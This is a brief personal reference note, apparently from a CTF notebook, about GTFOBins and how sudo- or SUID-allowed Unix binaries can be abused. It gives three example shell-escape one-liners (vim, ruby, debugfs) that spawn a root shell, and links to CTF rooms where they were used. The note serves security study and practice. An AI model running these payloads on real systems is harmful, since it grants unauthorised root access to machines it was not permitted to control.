---
type: tool
category: reference
related: [[sudo-abuse]], [[suid-enumeration]]
---

# GTFOBins

Curated list of Unix binaries that can be abused to break out of restricted contexts (sudo/SUID).

## How it's used

After `sudo -l` or a SUID scan reveals an allowed binary (e.g. `vim`, `ruby`), look it up to get a ready-made shell payload.

## Example payloads

```sh
sudo vim -c ':!/bin/sh' /dev/null
sudo ruby -e 'exec "/bin/sh"'
sudo -u <user> /sbin/debugfs -w <image>   # then: debugfs: !/bin/bash
```

## Seen in

[[trust]], [[obsession]], [[simple-ctf]], [[vacaciones]], [[hedgehog]], [[borazuwara]], [[hannah-coffee]]
